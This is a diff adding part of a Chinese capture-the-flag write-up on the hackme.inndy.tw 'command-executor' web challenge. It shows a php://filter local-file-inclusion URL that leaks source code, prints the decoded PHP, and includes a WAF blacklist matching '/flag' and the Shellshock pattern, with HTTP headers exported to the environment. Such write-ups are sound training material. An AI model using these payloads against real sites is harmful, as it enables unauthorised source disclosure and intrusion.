@@ -909,3 +909,193 @@ https://wp.hackme.inndy.tw/archives/date/2013/10/?s&debug=content
 （31 题似乎坏了？）
 
 这次源代码没那么简单能拿到了。这个站点看上去全是漏洞，但是获得一个能用的不容易。
+
+几个问题：
+
+- `https://command-executor.hackme.inndy.tw/index.php?func=ls&file=.` 中的 `file` 可以任意指定，可以用来查看系统文件结构。
+- `https://command-executor.hackme.inndy.tw/index.php?func=man&file=ls` 中的 `file` 可以任意指定，可以用来查看系统任意帮助文档。
+
+（然而并没有什么卵用）
+
+不过在该目录下：
+
+```shell
+total 332
+drwxr-xr-x 4 root root   4096 Jan  9  2018 bootstrap
+-rw-r--r-- 1 root root 293424 Jan  9  2018 cat-flag.png
+-rw-r--r-- 1 root root   1163 Jan  9  2018 cmd.php
+drwxr-xr-x 2 root root   4096 Jan  9  2018 comic-neue
+-rw-r--r-- 1 root root    612 Jan 19  2018 index.nginx-debian.html
+-rw-r--r-- 1 root root   2201 Jan  9  2018 index.php
+-rw-r--r-- 1 root root    515 Jan  9  2018 ls.php
+-rw-r--r-- 1 root root    658 Jan 19  2018 man.php
+-rw-r--r-- 1 root root    588 Jan  9  2018 untar.php
+-rw-r--r-- 1 root root  11829 Jan  9  2018 windows-run.jpg
+```
+
+可以看到 `cmd.php`, `ls.php` 等文件，再看 URL，是否可以本地文件包含？
+
+答案是可以的。
+
+```
+https://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=index
+```
+
+解码后：
+
+```php+HTML
+<?php
+$pages = [
+    ['man', 'Man'],
+    ['untar', 'Tar Tester'],
+    ['cmd', 'Cmd Exec'],
+    ['ls', 'List files'],
+];
+
+function fuck($msg) {
+    header('Content-Type: text/plain');
+    echo $msg;
+    exit;
+}
+
+$black_list = [
+    '\/flag', '\(\)\s*\{\s*:;\s*\};'
+];
+
+function waf($a) {
+    global $black_list;
+    if(is_array($a)) {
+        foreach($a as $key => $val) {
+            waf($key);
+            waf($val);
+        }
+    } else {
+        foreach($black_list as $b) {
+            if(preg_match("/$b/", $a) === 1) {
+                fuck("$b detected! exit now.");
+            }
+        }
+    }
+}
+
+waf($_SERVER);
+waf($_GET);
+waf($_POST);
+
+function execute($cmd, $shell='bash') {
+    system(sprintf('%s -c %s', $shell, escapeshellarg($cmd)));
+}
+
+foreach($_SERVER as $key => $val) {
+    if(substr($key, 0, 5) === 'HTTP_') {
+        putenv("$key=$val");
+    }
+}
+
+$page = '';
+
+if(isset($_GET['func'])) {
+    $page = $_GET['func'];
+    if(strstr($page, '..') !== false) {
+        $page = '';
+    }
+}
+
+if($page && strlen($page) > 0) {
+    try {
+        include("$page.php");
+    } catch (Exception $e) {
+    }
+}
+
+function render_default() { ?>
+<p>Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.</p>
+
+<img src="windows-run.jpg" alt="command executor">
+<?php }
+?><!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>Command Executor</title>
+    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
+    <link rel="stylesheet" href="comic-neue/font.css" media="all">
+    <style>
+      nav { margin-bottom: 1rem; }
+      img { max-width: 100%; }
+    </style>
+  </head>
+  <body>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
+      <a class="navbar-brand" href="index.php">Command Executor</a>
+
+      <ul class="navbar-nav">
+<?php foreach($pages as list($file, $title)): ?>
+        <li class="nav-item">
+          <a class="nav-link" href="index.php?func=<?=$file?>"><?=$title?></a>
+        </li>
+<?php endforeach; ?>
+      </ul>
+    </nav>
+
+    <div class="container"><?php if(is_callable('render')) render(); else render_default(); ?></div>
+  </body>
+</html>
+```
+
+还有 `cmd.php` 的源代码：
+
+```php+HTML
+<?php
+function render() {
+    $cmd = '';
+    if(isset($_GET['cmd'])) {
+        $cmd = (string)$_GET['cmd'];
+    }
+?>
+<h1>Command Execution</h1>
+<?php
+    echo '<ul>';
+    $cmds = ['ls', 'env'];
+    foreach($cmds as $c) {
+        printf('<li><a href="index.php?func=cmd&cmd=%s">%1$s</a></li>', $c);
+    }
+    echo '</ul>';
+?>
+
+<form action="index.php" method="GET">
+  <input type="hidden" name="func" value="cmd">
+  <div class="input-group">
+    <input class="form-control" type="text" name="cmd" id="cmd">
+    <div class="input-group-append">
+      <input class="btn btn-primary" type="submit" value="Execute">
+    </div>
+  </div>
+</form>
+<script>cmd.focus();</script>
+<?php
+
+    if(strlen($cmd) > 0) {
+        printf('<h2>$ %s</h2>', htmlentities($cmd));
+
+        echo '<pre>';
+        switch ($cmd) {
+        case 'env':
+        case 'ls':
+        case 'ls -l':
+        case 'ls -al':
+            execute($cmd);
+            break;
+        case 'cat flag':
+            echo '<img src="cat-flag.png" alt="cat flag">';
+            break;
+        default:
+            printf('%s: command not found', htmlentities($cmd));
+        }
+        echo '</pre>';
+    }
+}
+?>
+```
+
+(To be continued)
